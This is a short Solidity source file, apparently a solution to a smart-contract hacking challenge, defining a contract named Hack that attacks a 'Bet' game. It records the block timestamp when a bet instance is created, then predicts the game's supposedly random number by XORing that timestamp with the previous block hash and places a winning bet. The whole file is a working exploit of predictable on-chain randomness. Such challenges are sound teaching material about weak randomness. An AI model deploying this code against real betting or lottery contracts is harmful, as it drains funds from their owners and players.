// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0;

contract BetFactory {
  function create () public payable {}
  function validate (uint) public {}
}

contract Bet {
  function bet(uint) public payable {}
  
}

contract Hack {
  address target;
  uint timestamp;
  function create (address _factory) public payable {
    BetFactory factory = BetFactory(_factory);
    timestamp = block.timestamp;
    factory.create{value: msg.value}();
  }
  function validate (address _factory, uint token) public {
    BetFactory factory = BetFactory(_factory);
    factory.validate(token);
  }
  function run (address _target) public payable {
    target = _target;
    
    Bet instance = Bet(target);
    
    uint guess = timestamp ^ uint(blockhash(block.number - 1));
    instance.bet{value: msg.value}(guess);
    
  }
   receive () external payable {}
  
}


